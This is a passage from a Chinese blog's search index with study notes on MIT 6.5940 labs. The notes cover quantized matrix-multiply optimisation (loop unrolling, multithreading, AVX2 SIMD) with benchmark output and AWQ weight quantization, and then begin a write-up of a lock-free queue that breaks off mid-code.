<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>6.5940_lab5</title>
    <link href="/2023/12/25/6-5940-lab5/"/>
    <url>/2023/12/25/6-5940-lab5/</url>
    
    <content type="html"><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">(py310)tinychat-tutorial/transformer$ </span><span class="language-bash">./evaluate.sh reference</span><br>-------- Sanity check of reference implementation: Passed! -------- <br>Section, Total time(ms), Average time(ms), Count, GOPs<br>reference, 2481.241943, 248.123993, 10, 1.056503<br><br>All tests completed!<br></code></pre></td></tr></table></figure><h1 id="reference-cc"><a href="#reference-cc" class="headerlink" title="reference.cc"></a>reference.cc</h1><p>这个文件实现了一个矩阵乘法，并且由于为了在后面利用并行性和simd指令，看起来有点奇怪</p><p>首先，这里使用的量化策略为W4A8，因此一个uint8变量里其实存了两个权重，假设这个变量为w，那么这两个权重的值如下所示<br>$$<br>(w&amp;0x0F)-8\<br>(w&gt;&gt;4)-8<br>$$</p><p>即先进行位运算，然后减8，之所以要减8是因为4bit量化的真实的权重值就应该是$[-8,7]$，但是因为c语言中没有对应的实现，所以在代码实现中就比较曲折</p><p>取出来矩阵权重之后，就可以和输入相乘，将累加的结果最后再乘上缩放比例即可</p><h1 id="Loop-Unrolling-loop-unrolling-cc"><a href="#Loop-Unrolling-loop-unrolling-cc" class="headerlink" title="Loop Unrolling (loop_unrolling.cc)"></a>Loop Unrolling (loop_unrolling.cc)</h1><p>○   loop_unrolling</p><p>这里需要将最后一层循环手动展开，要对代码的理解更深一点</p><p>这里计算的是<em>A: m x k; B: n x k; C: m x n</em>，循环的顺序也是m,n,k，而在最初的reference的实现中，就将k这一层循环给拆成了以block_size为单位的循环，在x86部分的代码是，是拆分成了2*blocksize为单位的循环</p><p>而在每个2*blocksize中，w_int4是一个长度为32的数组，每一项都是两个4bit量化的权重，分别是[w0,w32]，[w1,w33]…..，a_int8是一个长度为64的数组，对应了64个权重</p><p>在$k&#x2F;(2*blocksize)$次循环中，计算出了acc，也就是数组C的对应元素</p><p>值得一提的是，这里矩阵计算的方法应该是$C&#x3D;A*B^T$，其中B就是权重矩阵，因此对于C的每个元素，都是由A中代码某一行，B中的某一行决定的</p><p>在我们手动展开循环时，是以4为单位展开了C的某一行，因此，我们需要A的某一行，B的某4行，这也是这段代码的意思</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> *a_int8 = &amp;A-&gt;int8_data_ptr[row * k + ch];<br><span class="hljs-comment">// pointer of the int4 weights</span><br><span class="hljs-type">uint8_t</span> *w0_int4 = &amp;B-&gt;int4_data_ptr[(col * k + ch) / <span class="hljs-number">2</span>];<br><span class="hljs-type">uint8_t</span> *w1_int4 = &amp;B-&gt;int4_data_ptr[((col + <span class="hljs-number">1</span>) * k + ch) / <span class="hljs-number">2</span>];<br><span class="hljs-type">uint8_t</span> *w2_int4 = &amp;B-&gt;int4_data_ptr[((col + <span class="hljs-number">2</span>) * k + ch) / <span class="hljs-number">2</span>];<br><span class="hljs-type">uint8_t</span> *w3_int4 = &amp;B-&gt;int4_data_ptr[((col + <span class="hljs-number">3</span>) * k + ch) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>然后因为这里是以2*blocksize为单位的循环，所以对于每个w和a，都涉及两个scalar参数</p><p>不过自己只需要写下面这个代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">signed</span> <span class="hljs-type">char</span> <span class="hljs-title">Getpost</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> a)</span> </span>&#123; <span class="hljs-keyword">return</span> (a &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">8</span>; &#125;<br><span class="hljs-function"><span class="hljs-type">signed</span> <span class="hljs-type">char</span> <span class="hljs-title">Getpre</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> a)</span> </span>&#123; <span class="hljs-keyword">return</span> (a &amp; <span class="hljs-number">0x0F</span>) - <span class="hljs-number">8</span>; &#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> qj = <span class="hljs-number">0</span>; qj &lt; <span class="hljs-number">32</span>; qj++) &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> decode a packed byte into two int8 in the range of (-8, 7)</span><br>    intermediate_sum0 += <span class="hljs-built_in">Getpre</span>(w0_int4[qj]) * a_int8[qj];<br>    intermediate_sum0_2nd += <span class="hljs-built_in">Getpost</span>(w0_int4[qj]) * a_int8[qj + <span class="hljs-number">32</span>];<br>    intermediate_sum1 += <span class="hljs-built_in">Getpre</span>(w1_int4[qj]) * a_int8[qj];<br>    intermediate_sum1_2nd += <span class="hljs-built_in">Getpost</span>(w1_int4[qj]) * a_int8[qj + <span class="hljs-number">32</span>];<br>    intermediate_sum2 += <span class="hljs-built_in">Getpre</span>(w2_int4[qj]) * a_int8[qj];<br>    intermediate_sum2_2nd += <span class="hljs-built_in">Getpost</span>(w2_int4[qj]) * a_int8[qj + <span class="hljs-number">32</span>];<br>    intermediate_sum3 += <span class="hljs-built_in">Getpre</span>(w3_int4[qj]) * a_int8[qj];<br>    intermediate_sum3_2nd += <span class="hljs-built_in">Getpost</span>(w3_int4[qj]) * a_int8[qj + <span class="hljs-number">32</span>];<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> int8 multiply and accumulate operation</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果不使用getpre和getpost函数，结果应该更好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">(py310)tinychat-tutorial/transformer$ </span><span class="language-bash">./evaluate.sh loop_unrolling</span><br>-------- Sanity check of loop_unrolling implementation: Passed! -------- <br>Section, Total time(ms), Average time(ms), Count, GOPs<br>loop_unrolling, 2114.875000, 211.487000, 10, 1.239525<br><br>All tests completed!<br></code></pre></td></tr></table></figure><h1 id="Multithreading-multithreading-cc"><a href="#Multithreading-multithreading-cc" class="headerlink" title="Multithreading (multithreading.cc)"></a>Multithreading (multithreading.cc)</h1><p>○   multithreading</p><p>这里的突破口在于要先看一下线程函数在做什么，可以发现，它收到了一个参数，包括了列的起始和末尾，以及paramas，因此可以判断，每个线程负责若干列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Thread creation</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num_thread; i++) &#123;<br>    threads_args[i].start = n * i / num_thread;<br>    threads_args[i].end = n * (i + <span class="hljs-number">1</span>) / num_thread;<br>    threads_args[i].params = params;<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thread_pool[i], <span class="hljs-literal">nullptr</span>, multithreading_worker_func, &amp;threads_args[i]);<br>&#125;<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Join threads</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num_thread; i++) &#123;<br>    <span class="hljs-built_in">pthread_join</span>(thread_pool[i], <span class="hljs-literal">nullptr</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>相比于原始的代码，快了差不多四倍，因为就是用了4个线程跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">(py310)tinychat-tutorial/transformer$ </span><span class="language-bash">./evaluate.sh multithreading</span><br>-------- Sanity check of multithreading implementation: Passed! -------- <br>Section, Total time(ms), Average time(ms), Count, GOPs<br>multithreading, 654.953979, 65.495003, 10, 4.002479<br><br>All tests completed!<br></code></pre></td></tr></table></figure><h1 id="SIMD-Programming-simd-programming-cc"><a href="#SIMD-Programming-simd-programming-cc" class="headerlink" title="SIMD Programming      (simd_programming.cc)"></a>SIMD Programming      (simd_programming.cc)</h1><p>○   simd_programming</p><p>这部分涉及到偏硬件的指令，但是可以把操作的东西看成一个很大而且很呆的数组即可</p><p>一些指令的解释</p><ol><li><code>_mm256_set1_epi8</code>，将每个字节都设置为传入的参数</li><li><code>_mm256_loadu_si256</code>，将数据加载入内存</li><li><code>_mm256_and_si256</code>，每个字节都和掩码相与</li><li><code>_mm256_srli_epi16</code>，右移移位操作</li><li><code>_mm256_sign_epi8</code>，第二个参数中每个位置的符号设置到第一个参数中对应的位置</li><li><code>_mm256_maddubs_epi16</code>，对应每个8bit相乘，并且将相邻的两个16bit相乘结果累加</li><li><code>_mm256_madd_epi16</code>，对每个对应的16bit相乘，并将两个相邻的16bit结果累加</li></ol><p>这里的代码逻辑外面套两层循环对数组C的每一项进行遍历，对于每一项的计算，分成若干个2*blocksize大小的块进行，我们要写的代码就是在每一块里，利用simd指令加速</p><p>具体来说，加速的方法就是不从c语言层面循环累加，而是利用硬件指令帮我们一次性完成多个相乘累加的操作</p><p>第一步是需要将两个block中的权重分别取出来，代码如下所示，取出来的结果是在每一个字节的低4位都是一个权重</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">__m256i raw_w = _mm256_loadu_si256(w_start);<br>__m256i lowbit_w = _mm256_and_si256(raw_w, lowMask);<br>__m256i highbit_w = _mm256_and_si256(_mm256_srli_epi16(raw_w, <span class="hljs-number">4</span>), lowMask);<br></code></pre></td></tr></table></figure><p>然后将这些权重减8，即恢复正确的零点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> __m256i zero_point = _mm256_set1_epi8(<span class="hljs-number">8</span>);<br>__m256i w_0, w_128;<br>w_0 = _mm256_sub_epi8(lowbit_w, zero_point);<br>w_128 = _mm256_sub_epi8(highbit_w, zero_point);<br></code></pre></td></tr></table></figure><p>现在就可以计算了，但是在正式计算之前，由于指令的限制，必须得先预处理一下，将第一个参数的所有值的符号都变成正数，第二个参数也相应的发生改变</p><p>最后补充乘法的操作即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">dot = _mm256_maddubs_epi16(ax, sy);<br>dot2 = _mm256_maddubs_epi16(ax2, sy2);<br></code></pre></td></tr></table></figure><p>可以发现，随着不断地相乘以及相邻元素累加，256&#x2F;8&#x3D;32对w和a，逐渐变成了16和8，因此最后是这样写入结果的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">C-&gt;data_ptr[row * n + col] = ptr[<span class="hljs-number">0</span>] + ptr[<span class="hljs-number">1</span>] + ptr[<span class="hljs-number">2</span>] + ptr[<span class="hljs-number">3</span>] + ptr[<span class="hljs-number">4</span>] + ptr[<span class="hljs-number">5</span>] + ptr[<span class="hljs-number">6</span>] + ptr[<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>性能提升了一倍多，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">(py310)tinychat-tutorial/transformer$ </span><span class="language-bash">./evaluate.sh simd_programming</span><br>-------- Sanity check of simd_programming implementation: Passed! -------- <br>Section, Total time(ms), Average time(ms), Count, GOPs<br>simd_programming, 1006.416992, 100.640999, 10, 2.604726<br><br>All tests completed!<br></code></pre></td></tr></table></figure><h1 id="Multithreading-with-Loop-Unrolling-multithreading-loop-unrolling-cc"><a href="#Multithreading-with-Loop-Unrolling-multithreading-loop-unrolling-cc" class="headerlink" title="Multithreading with Loop Unrolling      (multithreading_loop_unrolling.cc)"></a>Multithreading with Loop Unrolling      (multithreading_loop_unrolling.cc)</h1><p>○   multithreading_loop_unrolling</p><p>这题就是把前面两题缝合了一下，代码都不用改的</p><p>通过循环展开，速度比单纯的多线程确实要快一些</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">(py310)tinychat-tutorial/transformer$ ./evaluate.sh multithreading_loop_unrolling<br>-------- Sanity check of multithreading_loop_unrolling implementation: Passed! -------- <br>Section, <span class="hljs-function">Total <span class="hljs-title">time</span><span class="hljs-params">(ms)</span>, Average <span class="hljs-title">time</span><span class="hljs-params">(ms)</span>, Count, GOPs</span><br><span class="hljs-function">multithreading_loop_unrolling, 566.317017, 56.631001, 10, 4.628927</span><br><span class="hljs-function"></span><br><span class="hljs-function">All tests completed!</span><br></code></pre></td></tr></table></figure><h1 id="Combination-of-All-Techniques-all-techniques-cc"><a href="#Combination-of-All-Techniques-all-techniques-cc" class="headerlink" title="Combination of All Techniques      (all_techniques.cc)"></a>Combination of All Techniques      (all_techniques.cc)</h1><p>○   all_techniques</p><p>最后一题也是究极缝合怪，不过确实用上了三种优化技术</p><ol><li>首先，将C的列分成8个部分给8个线程同时计算</li><li>一个列依然是被还分成若干个2*blocksize部分，而这里是将这若干个2*blocksize给展开了，以每两个为单位进行展开。这里和之前的展开就不太一样了，之前的展开是同时展开这一列中的若干连续个元素</li><li>最后就是使用SIMD进行硬件级别的加速</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">(py310)tinychat-tutorial/transformer$ </span><span class="language-bash">./evaluate.sh all_techniques</span><br>-------- Sanity check of all_techniques implementation: Passed! -------- <br>Section, Total time(ms), Average time(ms), Count, GOPs<br>all_techniques, 146.906006, 14.690000, 10, 17.844336<br><br>All tests completed!<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>额外的bonus没做，但是还是有优化的空间的，可以从</p><ol><li>内存体系，特别是利用cache，重新安排取内存的顺序，或者组织一下线程取数据的方式，应该都有机会</li><li>cuda还没用上</li></ol><p>这次的lab封装的程度更大，背后应该是以这个完整的工具，整体的代码逻辑是</p><ol><li>先对输入进行量化，再计算矩阵的乘法，其中输入是8bit量化，矩阵参数是4bit量化，并且使用一种很风骚的方式交叉存储的</li><li>在具体计算的时候，会使用公式恢复一下精度，其中零点和scalar都在量化的时候记录在了paramas变量中</li></ol>]]></content>
    
    
    <categories>
      
      <category>模型压缩/加速</category>
      
      <category>MIT6.5940</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型压缩/加速</tag>
      
      <tag>MIT6.5940</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.5940_lab4</title>
    <link href="/2023/12/23/6-5940-lab4/"/>
    <url>/2023/12/23/6-5940-lab4/</url>
    
    <content type="html"><![CDATA[<h1 id="Question-1-50-pts"><a href="#Question-1-50-pts" class="headerlink" title="Question 1 (50 pts)"></a><strong>Question 1 (50 pts)</strong></h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>这里量化的思想时，如果输入很大，那么与它相乘的W就很重要（为什么不是输出很大，所以与它相乘的W就很重要？可能是因为输出很大的话，已经经过量化了，这一次已经来不及改了，要改也要等到下次训练）</p><p>所以对于每个W，计算了它的输入的每个特征的重要性，然后根据重要性，保留前百分之一的原始值，其他的都用量化值代替，示意图如下</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231223191557541.png" alt="image-20231223191557541"></p><p>之前的代码已经提供了一个<code>input_feat</code>，这是一个字典，键为模块的name，值为模块的输入对应的属性，<code>input_feat[i][j][k]</code>代表</p><ol><li>第i个模块</li><li>第j个输入</li><li>第k个特征</li></ol><p>因此若直接对<code>input_feat[i]</code>求和，就会得到一个长度为k的一维列表，代表了每个特征的重要性</p><h2 id="Question-1-1-20-pts"><a href="#Question-1-1-20-pts" class="headerlink" title="Question 1.1 (20 pts)"></a>Question 1.1 (20 pts)</h2><p>现在已经得到了输入的每个特征的重要性了，根据torch提供的topk可以求出前百分之一的下标，然后根据下标修改矩阵，然后在量化之后再恢复即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">outlier_indices = torch.topk(importance,k=<span class="hljs-built_in">int</span>(<span class="hljs-number">0.01</span>*<span class="hljs-built_in">len</span>(importance)))[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>这里有个问题就是为什么是修改矩阵的列？</p><p><code>outlier = m.weight.data[:, outlier_indices].clone()</code></p><p>查看pytorch对linear的实现后才发现，它的实现很骚气</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231223191551510.png" alt="image-20231223191551510"></p><h2 id="Question-1-2-15-pts"><a href="#Question-1-2-15-pts" class="headerlink" title="Question 1.2 (15 pts)"></a>Question 1.2 (15 pts)</h2><p>随机生成百分之一个数的下标和之前的方法对比</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">outlier_mask = torch.randint(<span class="hljs-number">0</span>, length, (length//<span class="hljs-number">100</span>,), dtype=torch.int32)<br></code></pre></td></tr></table></figure><h2 id="Question-1-3-15-pts"><a href="#Question-1-3-15-pts" class="headerlink" title="Question 1.3 (15 pts)"></a>Question 1.3 (15 pts)</h2><p>输入越重要，说明对应的矩阵也重要，所以尽量不要损失精度</p><h1 id="Question-2-50-pts"><a href="#Question-2-50-pts" class="headerlink" title="Question 2 (50 pts)"></a><strong>Question 2 (50 pts)</strong></h1><h2 id="Question-2-1-20-pts"><a href="#Question-2-1-20-pts" class="headerlink" title="Question 2.1 (20 pts)"></a>Question 2.1 (20 pts)</h2><p>代码和之前的一样</p><ol><li>先求出重要的矩阵参数</li><li>将重要的矩阵参数先扩大scalar倍</li><li>量化</li><li>恢复重要的矩阵参数</li></ol><h2 id="Question-2-2-15-pts"><a href="#Question-2-2-15-pts" class="headerlink" title="Question 2.2 (15 pts)"></a>Question 2.2 (15 pts)</h2><p>1：121.90</p><p>2：18.93</p><p>4：21.26</p><p>之前之所以会下降，是因为量化后策略生效了</p><p>之后会上升，是因为提升的幅度太大，导致最大值超过了原来的最大值，从而增加了误差</p><h2 id="Question-2-3-15-pts"><a href="#Question-2-3-15-pts" class="headerlink" title="Question 2.3 (15 pts)"></a>Question 2.3 (15 pts)</h2><p>这一部分关键在这个函数，这个函数的作用是尝试找出最合适的scalar值，就是for循环枚举可能的情况，找出一个最好的</p><ol><li>第一个参数为模块</li><li>第二个参数是要拉伸的矩阵（KQV）</li><li>第三个参数是输入</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_search_module_scale</span>(<span class="hljs-params">block, linears2scale: <span class="hljs-built_in">list</span>, x, kwargs=&#123;&#125;</span>)<br></code></pre></td></tr></table></figure><p>但是要写代码的地方没太大难度，按照提示来</p><p>首先是初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">best_error = torch.inf<br>best_ratio = -<span class="hljs-number">1</span><br>best_scales = -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后是按照公式计算scalar</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">scales = torch.clamp(s_x,<span class="hljs-number">1e-5</span>)**ratio<br></code></pre></td></tr></table></figure><p>最后是量化之后恢复重要的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fc.weight.div_(scales)<br></code></pre></td></tr></table></figure><p>这一大段代码的意思应该是</p><ol><li>先是为每个模块找到了一个最优的scalar</li><li>然后好像还使用了另一种优化的方法，即将前面除以一个数，后面的乘上一个数，这样可以避免出现分布不均匀的情况，并且激活还不会改变。而在这里，直接将之前求得的scalar作为这个参数</li></ol>]]></content>
    
    
    <categories>
      
      <category>模型压缩/加速</category>
      
      <category>MIT6.5940</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型压缩/加速</tag>
      
      <tag>MIT6.5940</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络程序设计_课程项目</title>
    <link href="/2023/12/21/lock-free-queue/"/>
    <url>/2023/12/21/lock-free-queue/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97">为什么需要无锁队列？</a></li><li><a href="#%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8D%95%E8%AF%BB%E5%8D%95%E5%86%99">无锁队列的实现（单读单写）</a><ul><li><a href="#%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0">原子操作函数</a></li><li><a href="#yqueue_t%E7%9A%84chunk%E5%9D%97%E6%9C%BA%E5%88%B6">yqueue_t的chunk块机制</a><ul><li><a href="#chunk%E4%B8%80%E6%AC%A1%E5%88%86%E9%85%8D%E5%A4%9A%E4%B8%AA%E5%85%83%E7%B4%A0">chunk一次分配多个元素</a></li><li><a href="#chunk%E5%9D%97%E6%9C%BA%E5%88%B6-%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86">chunk块机制 局部性原理</a></li></ul></li><li><a href="#yqueue_t%E6%88%90%E5%91%98%E5%92%8C%E6%8E%A5%E5%8F%A3%E4%BB%8B%E7%BB%8D">yqueue_t成员和接口介绍</a><ul><li><a href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0yqueue_t">构造函数yqueue_t</a></li><li><a href="#%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0yqueue_t">析构函数~yqueue_t</a></li><li><a href="#frontback%E5%87%BD%E6%95%B0">front、back函数</a></li><li><a href="#push%E5%87%BD%E6%95%B0">push函数</a></li><li><a href="#unpush%E5%87%BD%E6%95%B0">unpush函数</a></li><li><a href="#pop">pop</a></li></ul></li><li><a href="#ypipe">ypipe</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E5%86%99%E5%85%A5%E5%92%8C%E8%AF%BB%E5%8F%96">如何写入和读取</a></li><li><a href="#%E8%AF%BB">读</a></li><li><a href="#wrfc%E8%AF%A6%E8%A7%A3">w,r,f,c详解</a><ul><li><a href="#ypipe_t">ypipe_t</a></li><li><a href="#write">write</a></li><li><a href="#flush">flush</a></li><li><a href="#read">read</a></li><li><a href="#check_read">check_read</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86%E5%8D%95%E8%AF%BB%E5%8D%95%E5%86%99">整体思路梳理（单读单写）</a></li><li><a href="#%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%AF%BB%E5%A4%9A%E5%86%99">无锁队列的实现（多读多写）</a><ul><li><a href="#arraylockfreequeue">ArrayLockFreeQueue</a></li><li><a href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D">函数介绍</a><ul><li><a href="#%E5%8F%96%E4%BD%99%E5%87%BD%E6%95%B0">取余函数</a></li><li><a href="#%E5%85%A5%E9%98%9F%E5%87%BD%E6%95%B0enqueue">入队函数enqueue</a></li><li><a href="#%E5%87%BA%E9%98%9F%E5%87%BD%E6%95%B0dequeue">出队函数dequeue</a></li><li><a href="#%E5%A4%9A%E8%AF%BB%E5%A4%9A%E5%86%99%E7%9A%84%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93">多读多写的机制总结</a></li></ul></li><li><a href="#yield%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7">yield的重要性</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93%E8%87%B4%E8%B0%A2">总结&amp;致谢</a></li></ul><h1 id="为什么需要无锁队列？"><a href="#为什么需要无锁队列？" class="headerlink" title="为什么需要无锁队列？"></a>为什么需要无锁队列？</h1><p>传统的高并发场景中，是使用阻塞机制来避免并发带来的各种问题。但是传统的阻塞机制有以下两个问题</p><ol><li>阻塞意味着线程要进行切换，而线程的切换会带来cache的失效。而cache作为存储体系中最重要的一环，频繁地失效肯定会带来极大的开销和性能损失</li><li>如果一个线程要处理的事情非常多，但是它却经常为了某个资源而被阻塞住，那肯定会降低系统的吞吐量，带来很高的延迟</li></ol><h1 id="无锁队列的实现（单读单写）"><a href="#无锁队列的实现（单读单写）" class="headerlink" title="无锁队列的实现（单读单写）"></a>无锁队列的实现（单读单写）</h1><h2 id="原子操作函数"><a href="#原子操作函数" class="headerlink" title="原子操作函数"></a>原子操作函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">atomic_ptr_t</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set</span><span class="hljs-params">(T *ptr_)</span></span>; <span class="hljs-comment">//⾮原⼦操作</span><br>    <span class="hljs-function">T *<span class="hljs-title">xchg</span><span class="hljs-params">(T *val_)</span></span>; <span class="hljs-comment">//原⼦操作，设置⼀个新的值，然后返回旧的值</span><br>    <span class="hljs-function">T *<span class="hljs-title">cas</span><span class="hljs-params">(T *cmp_, T *val_)</span></span>;<span class="hljs-comment">//原⼦操作</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">volatile</span> T *ptr;<br>&#125;;<br></code></pre></td></tr></table></figure><ol><li><code>set</code>是直接设置ptr的值</li><li><code>xchg</code>是设置ptr的值为val，并返回ptr设置之前的值</li><li><code>cas</code>是先比较<ol><li>若ptr和cmp相同，则设置ptr为val并返回ptr设置之前的值</li><li>若ptr和cmp不同，不设置ptr，直接返回ptr的值</li></ol></li></ol><h2 id="yqueue-t的chunk块机制"><a href="#yqueue-t的chunk块机制" class="headerlink" title="yqueue_t的chunk块机制"></a>yqueue_t的chunk块机制</h2><h3 id="chunk一次分配多个元素"><a href="#chunk一次分配多个元素" class="headerlink" title="chunk一次分配多个元素"></a>chunk一次分配多个元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_t</span> &#123;<br>   T values[N];<br>   <span class="hljs-type">chunk_t</span> *prev;<br>   <span class="hljs-type">chunk_t</span> *next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>一个chunk包含N个元素，因此可以减少分配内存的次数</p><p>会有一个spare_chunk的结构将空闲的chunk保存起来，需要的时候就可以直接拿出来用。在一个chunk空闲时，也不会直接删除，而是放入spare_chunk中</p><h3 id="chunk块机制-局部性原理"><a href="#chunk块机制-局部性原理" class="headerlink" title="chunk块机制 局部性原理"></a>chunk块机制 局部性原理</h3><p>利用局部性原理，可以将刚刚空闲的chunk放到spare_chunk中先保存着。如果后面马上就用上了，那就可以节省很多时间，而如果没用上，至少也可以省去重新分配动态内存的时间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">atomic_ptr_t</span>&lt;<span 